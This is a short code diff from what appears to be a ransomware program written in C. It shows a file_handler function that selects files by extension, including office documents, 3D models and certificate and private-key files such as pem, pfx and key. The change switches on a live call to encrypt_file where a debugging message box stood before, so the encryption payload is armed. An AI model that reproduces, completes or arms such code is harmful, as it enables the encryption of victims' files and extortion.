@@ -203,7 +203,7 @@ VOID file_handler(CONST CHAR * filepath)
 		StrCmp(file_ext, "ods") == 0 || StrCmp(file_ext, "3dm") == 0 || StrCmp(file_ext, "max") == 0 || StrCmp(file_ext, "3ds") == 0 || StrCmp(file_ext, "uot") == 0 ||
 		StrCmp(file_ext, "stw") == 0 || StrCmp(file_ext, "sxw") == 0 || StrCmp(file_ext, "ott") == 0 || StrCmp(file_ext, "odt") == 0 || StrCmp(file_ext, "pem") == 0 ||
 		StrCmp(file_ext, "p12") == 0 || StrCmp(file_ext, "csr") == 0 || StrCmp(file_ext, "crt") == 0 || StrCmp(file_ext, "key") == 0 || StrCmp(file_ext, "pfx") == 0 || StrCmp(file_ext, "der") == 0) {
-		//encrypt_file(filepath, 1);
-		MessageBox(0, filepath, "1", MB_USERICON);
+		encrypt_file(filepath, 1);
+		//MessageBox(0, filepath, "1", MB_USERICON);
 	}
 }
